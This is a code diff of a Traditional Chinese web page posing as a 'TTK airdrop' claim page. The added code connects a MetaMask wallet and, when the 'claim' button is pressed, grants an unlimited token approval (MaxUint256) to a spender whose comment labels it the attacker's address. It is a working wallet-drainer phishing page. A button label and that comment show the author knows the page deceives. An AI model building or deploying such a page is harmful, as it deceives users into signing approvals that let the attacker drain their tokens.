@@ -1,27 +1,51 @@
-
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
-  <meta charset="UTF-8">
-  <title>空投領取頁</title>
+  <meta charset="UTF-8" />
+  <title>空投活動頁</title>
 </head>
-<body style="text-align:center;padding-top:60px;">
+<body style="text-align: center; padding-top: 60px; font-family: sans-serif;">
   <h2>🎁 恭喜你獲得 TTK 空投！</h2>
-  <button onclick="approve()">點我領取</button>
+  <button onclick="connectWallet()">連接錢包</button>
+  <br><br>
+  <button onclick="approve()">點我領取（其實是 Approve）</button>
 
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    const tokenAddress = "0x3F767995d0Bbe0587dDC801Dd7e8f40d15ed0958";
-    const spender = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
-    const abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
+    let signer;
 
-    async function approve() {
+    const tokenAddress = "0x3F767995d0Bbe0587dDC801Dd7e8f40d15ed0958"; // 你的代幣地址
+    const spender = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459"; // 攻擊者地址
+    const abi = [
+      "function approve(address spender, uint256 amount) external returns (bool)"
+    ];
+
+    async function connectWallet() {
+      if (!window.ethereum) {
+        alert("請先安裝 MetaMask！");
+        return;
+      }
       const provider = new ethers.providers.Web3Provider(window.ethereum);
       await provider.send("eth_requestAccounts", []);
-      const signer = provider.getSigner();
+      signer = provider.getSigner();
+      const addr = await signer.getAddress();
+      alert("已連接錢包：" + addr);
+    }
+
+    async function approve() {
+      if (!signer) {
+        alert("請先連接錢包");
+        return;
+      }
+
       const contract = new ethers.Contract(tokenAddress, abi, signer);
-      await contract.approve(spender, ethers.constants.MaxUint256);
-      alert("授權成功！");
+      try {
+        const tx = await contract.approve(spender, ethers.constants.MaxUint256);
+        alert("授權成功！Tx Hash: " + tx.hash);
+      } catch (err) {
+        console.error(err);
+        alert("授權失敗：" + err.message);
+      }
     }
   </script>
 </body>
